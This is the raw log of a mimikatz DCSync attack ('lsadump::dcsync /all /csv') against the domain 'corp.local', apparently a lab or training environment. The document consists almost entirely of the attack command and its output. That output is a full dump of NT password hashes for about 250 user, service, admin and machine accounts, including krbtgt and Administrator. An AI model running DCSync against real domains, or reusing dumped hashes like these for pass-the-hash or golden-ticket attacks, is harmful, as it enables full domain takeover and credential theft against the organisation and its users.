Using 'mimikatz.log' for logfile : OK

mimikatz(commandline) # lsadump::dcsync /all /csv
[DC] 'corp.local' will be the domain
[DC] 'DC01.corp.local' will be the DC server
[DC] Exporting domain 'corp.local'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
1604	GStephenson	a6c9bca7e1f4076c538ff6e7096d59be	66048
1605	AMountgarrett	4b76b38df5e9adf9739c8f43869d91ce	66048
1606	JHann	1d863479e1ab3bd62a2bfafa1abaa2dd	66048
1607	LBellantoni	2c019748d27c982f3be03c378759a954	66048
1608	LGresham	520d2dcba9759412cda4eeeb524e5407	66048
1609	EReynolds	bb413fd4eab36d867ae30ca134911ef6	66048
1610	MTorres	a1e69cd82485430ad9f732a7673b0732	66048
1611	OCollier	9e5c6bcd86c00d97c22f8630be9e4f35	66048
1612	KSteele	4192316432ae3c0b0e9c948d494e64fa	66048
1613	LMacghey	35fb7b7d541ed4fee611fbefe89707c6	66048
1614	FFigueroa	d365fa7447d7cf17e62ba4758b67632e	66048
1615	RFord	ece851cce21d0092e2d1e61537dd351e	66048
1616	LPotter	6ded62367988f54d2d562621d6532051	66048
1617	SYoung	64f12cddaa88057e06a81b54e73b949b	66048
1618	BMoore	65d8f7784ce4eed6b2c1a028c4e54866	66048
1619	ZWootten	561d7ee942fadd19101ccdb0a5fde05a	66048
1620	SBradshaw	c377ac42a9918b3ccda3f1585484665a	66048
1621	DDavis	027dcae638b664716cdc075fa4cbc493	66048
1622	EMoulds	916c1dbf6a2a698bfbb4104d3fe55974	66048
1623	AJackson	d5aeb975ac6af0e64c488f2216a877e7	66048
1624	MWhiddon	c5e393be1ff24f0fb5c823594bba7b18	66048
1625	AKidd	a00a20db1bac75f6837602c892b725fa	66048
1626	GKelly	4d5351f183915a1bebdb05adc108eda3	66048
1627	ABuchanan	4f0fbf6796fbad886a2567412842ea57	66048
1628	SHancock	64e2807587782a17bd4cbd524f27941d	66048
1629	LGraham	07ae9736b127651f78a2f0e7fa85c5a2	66048
1630	NWong	18d35edf54a8586accd66a9750f091d2	66048
1631	KHolmes	4b76b38df5e9adf9739c8f43869d91ce	66048
1632	EPenman	b7f92ec7a5f25ea04db44b88e9c77cdc	66048
1633	SCardiel	cc3077c360d91577d529243ee2e306c8	66048
1634	MLeach	573b24797078830a216fec947ea233a9	66048
1635	SConnell	759188716874b63c41a1fbc746b11f47	66048
1636	MArnold	cfc0f01a43aa5aca4d17cd1b4c96df5d	66048
1637	JHancock	fa2f9a7cdbcacef81d9281b24bd2fcce	66048
1638	LNorris	3deb3f3668e1371949ae72258ad6eed4	66048
1639	KDaniels	9b9bbb09be33802f9f637d5ce79fe0cb	66048
1640	LOwens	323c3e173e2661f8c4adeb8aa2f2a72d	66048
1641	HBooth	03893bc674bb6caf7f6bc92970e7ef21	66048
1642	CPearson	47b505a26891a5358c2638b0f621b31a	66048
1643	ABaxter	9ea8eb58b55e3abbb9d4eefae2b1f5c0	66048
1644	BMarshall	8b63b2668d9733db0d33026023a7549c	66048
1645	GCaley	9d9cddf89521ab955f454cc978d966a0	66048
1646	JByrne	ec0a6ca119e8e1007aba6fd2a38a3869	66048
1647	RKeighley	9798c9db0fd3b284b20ca0698b46c876	66048
1648	HHoward	c8a305437b69ca45fd7cb4cc9bab0617	66048
1649	TRowley	f20d9bc8e802ab800675436dd96c65e9	66048
1650	GLamb	64f12cddaa88057e06a81b54e73b949b	66048
1651	BHarricks	41060bff7593b66cfe48ed6ea374c9c9	66048
1652	ROh	8ce8da741acd34384fa9d75393c92ba3	66048
1653	KPollard	b6856939f91eee3ec24be4cda68436d4	66048
1654	PCarter	87ebfbf2ec0bc9a231bcebdc6255989c	66048
1655	COgden	be2cc297f1760ac88624e7accf283e26	66048
1656	MCarrodus	4b76b38df5e9adf9739c8f43869d91ce	66048
1657	MLawson	f1fe60b99d69336646a45fa198892d46	66048
1658	WLawson	bf71f3d4c3206abdc2aa1b68752f693c	66048
1659	LHerbert	66727a3768997eb77a12331a322d2e82	66048
1660	JBeor	4c2211d02122f240912c384642bcc4ba	66048
1661	JJones	d32b1cd6598c371dbed599e0d55f6174	66048
1662	ABowen	26be5a4f670ad0c061b098e453935af5	66048
1663	MMcCarthy	6c3c71b6d822886bfe439e2b98c381ce	66048
1664	VBuffington	e671583afcb2d9ad1d681912b24c08c5	66048
1665	SLin	79329c71fbfd86a03992cbb03160fe87	66048
1666	ESmart	8d8fe63f7562d5a891114786ffd03358	66048
1667	FSavage	ece851cce21d0092e2d1e61537dd351e	66048
1668	RScott	ed276ffd7da1af554b93d217cb65f36a	66048
1669	JLaw	84d94340a3c65421035d670595341fd6	66048
1670	LSingh	ddc032f980fe3c96f1c2f9d14ef05746	66048
1671	CHammon	f694d4f0bf77aa23a22d6a7d53064e80	66048
1672	EFry	44e635db44220d2a16384f9bad6a60bd	66048
1673	EWarren	1625baf0e4d9db7e4b0a24fb67b2ace9	66048
1674	AGould	9f5315e746fe5eb09219664b6a49fd50	66048
1675	WNeal	b54e813a4bc4cae66ee3dddb2e66ad46	66048
1676	MKnatchbull	1d863479e1ab3bd62a2bfafa1abaa2dd	66048
1677	AHamilton	e21d7bb4b95413f6b84ebda1dd247c0c	66048
1678	RSelleck	5afa338bc4f1e4293106213986c824d5	66048
1679	SToRot	c9d2146e50b099f7786ea3717a485d33	66048
1680	CCumming	f788d1fa13e341d6a07032627ae505f5	66048
1681	FMiddleton	00eb6ddeb5920cdd97cb280cedef7026	66048
1682	KMellor	01aacd1a08cfcead61f2ee181830c1d2	66048
1683	IJohn	84822e9c5312eea480c4c6ce5a493252	66048
1684	DThompson	2b0f89ee98a92adcfeb118ea21333718	66048
1685	LKoerstz	0d1954a1f2d8e13d8c74a327792e97b2	66048
1686	KReed	67ea7eaec614c4de8a22de3e98c43161	66048
1687	HBenevides	56326692b2ea040143a8710cf7695feb	66048
1688	MBrady	75bb6f72fb4794e306893a62dcbff707	66048
1689	KPearce	39be7b93a1f16e63f17f17aa66aa29e4	66048
1690	EGill	27cc9a81623cc008c065f8e64b75cdfd	66048
1691	LMarshall	43b8073a6c75e7ab8c29edb56bb1ab3b	66048
1692	MCartwright	a673f5b7f3729f9f4510c379ad744db6	66048
1693	BSampson	aa9c4d6dafc3a4b03cee581cbe670129	66048
1694	APike	ca6f9eae5f56fbf25ce86a43e9a77031	66048
1695	FSaville-Kent	8b63b2668d9733db0d33026023a7549c	66048
1696	KPowell	58341c26067e0cfd752fa6f119c8dec9	66048
1697	AKohler	95296e30a817888762462048aebcde36	66048
1698	KMartin	7f03c1fe94ab6e28a4809199ebfb1cbb	66048
1699	MHolmes	02e1987fd9b1d1acf7cb8b082795e996	66048
1700	LRussell	f7395b53a4726b562bc157e067ed93a3	66048
1701	MPackard	09091d70dd70726a1187df6e3bdf8f4f	66048
1702	DPatterson	0d37931b52b8ddf9c1d36d583345be9a	66048
1703	IBarry	93f5e37fe12876862309466efd17be11	66048
1704	JSwift	61e5454f120a2282b4c78bfe4634af49	66048
1705	GMitchell	2ccd272240b60a21ebda790208000304	66048
1706	ABailey	d81c814de010fbdc3fc84ee015cad44e	66048
1707	MWalker	8bab3ffefa95a133b0ae8dd9e651bc84	66048
1708	AJones	559e493314abd2eb6edcf6c48ae5c810	66048
1709	LSimon	6402b4ef6528c2426c9987e179b08d62	66048
1710	EBailey	e513a1133b17cba55361d44a952cfe6e	66048
1711	ECunningham	9cab9f872de824f8418587be8609de08	66048
1712	SHolden	1041830d4ec9d5bda91bb446a67edc3a	66048
1713	LMoreland	5f972cab25672e19d5f3fd7d5ed69200	66048
1714	JBennett	64f12cddaa88057e06a81b54e73b949b	66048
1715	JWade	4a150c7e689e86111ea3ee5b9181ddfd	66048
1716	WWinston	9ef97712b2c17c40644a9a1a10f1d728	66048
1717	LWestgarth	ece851cce21d0092e2d1e61537dd351e	66048
1718	FMills	76cb7a4755d0260f849b2c29d236f0de	66048
1719	COrman	bdb097d761970e3a4a88c8918ee10775	66048
1720	LHarper	75cdbf523fcac7a878834930fd965b13	66048
1721	TKirkpatrick	5546e054f13c8637683188269dd470bb	66048
1722	ADeLaRue	a6dd8f6d95eafdc060b1d23c1035a7dd	66048
1723	LPatterson	7e45b4a9730ef6f24571ae0c4ddd87e3	66048
1724	JStaton	1d863479e1ab3bd62a2bfafa1abaa2dd	66048
1725	MParsons	51492f4f5e17aeba063802ae0cb56ce9	66048
1726	LKnowles	b8bd4666275af2c0663efcafda89d347	66048
1727	SAckermann	eae73b6e767dccf4352ace4632827cf2	66048
1728	EHaynes	971d12216efae149d802d3be5f808eb2	66048
1729	AShuman	5750bf24160ace7be06511fdf59ec3aa	66048
1730	RChapman	c6704557b243346d18187ab0e6ca97c3	66048
1731	ADinah	4b76b38df5e9adf9739c8f43869d91ce	66048
1732	JJenkins	8e0d9314f006754acc12ad75a4ff69d0	66048
1733	JGoodwin	303ccfcdd9da88fd90d27e575fac52e3	66048
1734	JKing	e74a32303b66c5dd74420370d79ec1ae	66048
1735	EBrigden	0b6e2d264fb1ce0c94ca9817db9c36ab	66048
1736	SBroger	0e122898273eda6778fb2d063d8a22ea	66048
1737	RHussain	b9aad14098139a0f873e4bb6d4e58622	66048
1738	TLowry	5a2505b9b341ae318a225bf3ca114e53	66048
1739	SMilliner	466e64f74644b5140f4217ae603f5f67	66048
1740	LGibbons	be492166e246fef07474f6921cdc2a35	66048
1741	NMyers	24b1dea160393a3d9ee05fe9a2c757ed	66048
1742	MCampion	94c3b05113e3270e5360c9bde6c17513	66048
1743	LBracco	5bf38ec6c81869439594c07db1933bac	66048
1744	LToomey	c08cedf54ca8f1bf7978ab922a7b1261	66048
1745	AHarmon	d2c9fa9b2b5e3c6e038d0afdb5eefef7	66048
1746	ATraeger	3c160d2c42f1cf6b9612d6423079eec4	66048
1747	LNewton	bc97319df7222ebdeb1c25f276affa58	66048
1748	ACarr	8bcdd72766bccaf79f7fab4ff5843a68	66048
1749	DCrawley	f78e7c0ef3e325e6dad05dc3049e0fc7	66048
1750	MConti	04e49106e7c1fd68554d6a22d3af88b3	66048
1751	MWhitehead	79e54742e248c056b289a013cdff2d4a	66048
1752	SArellano	c9853c98df60eeec6a85dc860a697054	66048
1753	MMoore	e51ad577f101aeb070374349c100b851	66048
1754	LLevey	52d9bf75e9c0008032aa33466a0946a4	66048
1755	KBentley	143a9a30dd7d9d9bfac2fe6a8a1e106d	66048
1756	AGermany	abc794bf67d07fb15298c067bc4623ae	66048
1757	CFinch	9ac5ecd1ab4344f58f10f03489288d4a	66048
1758	DRussell	64f12cddaa88057e06a81b54e73b949b	66048
1759	BJones	0053d420feb1e8f528bd335871935bf7	66048
1760	DWarren	478727ee2d1b9885337917bd7aa27e78	66048
1761	ATrickett	d48dccd31a8b53cd5355ffa1d09e3542	66048
1762	JBarlow	aebc53a7caff7d0487f779c852383008	66048
1763	KWallace	be585716872874823f1d97d38aeaf1c0	66048
1764	MReynolds	445002739674101debc8eb33857b0746	66048
1765	MOrmond	67e70fd5083281dfb54b0854aeb25c15	66048
1766	JDay	5ffc1be50e8179244f47cfbe5bd1ae3b	66048
1767	MDaly	892a28f9f0e457c9e0293c46803f7b49	66048
1768	CHernandez	272b396c444e56e672d2424afac32141	66048
1769	LBroger	b1e091095aebf0f15bd0deab19227338	66048
1770	BSpeckman	76a424adfb96b9c7c02d32c9242a8bf7	66048
1771	DSilva	8721075c7348c15286efca1615ce9635	66048
1772	RGregg	e94d378a02d3443816ea7067445ed20d	66048
1773	RFisken	829bdc07102ec41d47a9b8172bda2654	66048
1774	CWaldrop	8d5b508097a9e4c12281b8e9ea25336e	66048
1775	JTrumble	8b63b2668d9733db0d33026023a7549c	66048
1776	GCoates	1d863479e1ab3bd62a2bfafa1abaa2dd	66048
1777	ABell	ccfcb280acd2794d6980de8a75956585	66048
1778	HBailey	878dad3f6cf16bd14770b18ba77226e1	66048
1779	EBarrett	58b584aa78f066a24abae00a6eae450e	66048
1780	CMacansh	e09d4ac63258ceb0da1c983e82372b80	66048
1781	SMain	117ce9cbc94ca938217c6483c5aad8ff	66048
1782	CHein	c87ea7365e0de6ac1edfe50da09695bb	66048
1783	ESullivan	3c62e864328d7251fa49bedfe9468b43	66048
1784	OMiah	2e63fbfec16712c362f119c7262f0bad	66048
1785	JDobie	184307fa9d75ae588e2f65ae1ea9f68b	66048
1786	IChamberlain	04bc7fcdd73d6b09f93bc2268571f731	66048
1787	EDoherty	f649e8168e2f5b5360ff94017770fbd1	66048
1788	FRowley	8925b6e1983dda5ff805e901fdd98533	66048
1789	JAdams	51726004de454c805db3fe86f617c58a	66048
1790	AEaton	49c6543dfbbed0f86449a51962db90be	66048
1791	WNorth	d6884cc695e41472a1aaa95f9f6869d6	66048
1792	DSims	13886e3088483faea6e980fc5721866b	66048
1793	ICoane	4685b7caf90f8f44b793c090b856d0b7	66048
1794	CParker	0f438480c6c552c73489c4e5165f7a66	66048
1795	HNewman	f1c39469a92a7628fb2c9c02d70cb204	66048
1796	MRucker	f6775e0393124d81ecbd37d84debe7d3	66048
1797	ORamsay	bc97319df7222ebdeb1c25f276affa58	66048
1798	CBoyle	c1aaf0fb88cc4beb02b2025a1489019b	66048
1799	RCross	6c4745e0e902f19b8d65859df3b350b8	66048
1800	DCrawford	6e5476ae318e5117083410e726ebb7f9	66048
1801	Rwallace	1d863479e1ab3bd62a2bfafa1abaa2dd	66048
502	krbtgt	cba2ed22077aa56ae957bcf43a8d82f8	514
1815	svc_splunk	2f70db5ec87a1afb4d1100e9766812ab	512
1818	svc_sccm	5e694c9acbd19f3fed6896073cf32453	512
1816	svc_mssql	c1c2432e47927c6e92e4be9804b4cdb5	512
1817	svc_commvaultdb	615ef21c4406e9a4ffd5661e9180b4f9	512
1111	joe	fde396caf28acc233207b2706483024f	512
1810	svc_testldap	4631948d60fe57a27d51dda9ef519b95	512
1120	vincent.delpy	f5e7702e1032710f9f16ef8a691da861	512
1807	cyberops_svc	45b679ec3f3dcd1b47fbd7fa1ebd847e	512
1110	bob	b38c126d0faabc61362ecc83ccb0cd08	512
3603	ned_adm	5f3fe41a3d96528a52a8a40d935b1d61	514
1603	justalocaladmin	c718f548c75062ada93250db208d3178	514
1119	lazy_admin	d168f91992f800743144f24518de5f2b	512
3609	svc_devops	c718f548c75062ada93250db208d3178	512
1000	DC01$	15f2eda7fa69eb8c2eddf511d6e77578	532480
1811	SQL01$	b40dae2bd88b86bf78ea95ba80f95f33	4096
7101	WEB-WIN01$	e3d78bc48d069bba3d3e34b0cae59547	4096
3602	MS01$	b0008678126a9a7143961c96161725a4	4096
5101	svc_opmanager	6bd08e1c070d29efaca47f3d7f816509	512
1812	FS01$	64bc93857fbd23f816fa187333b11aa0	4096
1813	WS02$	c72e375bed0918ced38b7a8d3e7f5e09	4096
1820	wsadmin	669b12a3bac275251170afbe2c5de8c2	512
4102	WSADM$	19f221a69c0693ebfdc064393b55d509	4096
3608	DEV$	f571cbf193dfe466f9811eb669480d77	2080
1819	svc_iis	57e1e2964bd92fb501808c45c90d724e	512
500	Administrator	0109d7e72fcfe404186c4079ba6cf79c	512
3604	ned.flanders_adm	deff72637376f94d8e6c3fab3270f65d	512
1122	iamtheadministrator	70016778cb0524c799ac25b439bd67e0	512
1113	bill	47b4d6012d7dcf231d8533758231c80d	512
3611	pgibbons	0694311c666b622f590f1c1837422c5f	512
1114	salvador	8119935c5f7fa5f57135620c8073aaca	512
1804	cyber_adm	8119935c5f7fa5f57135620c8073aaca	512

mimikatz(commandline) # exit
Bye!
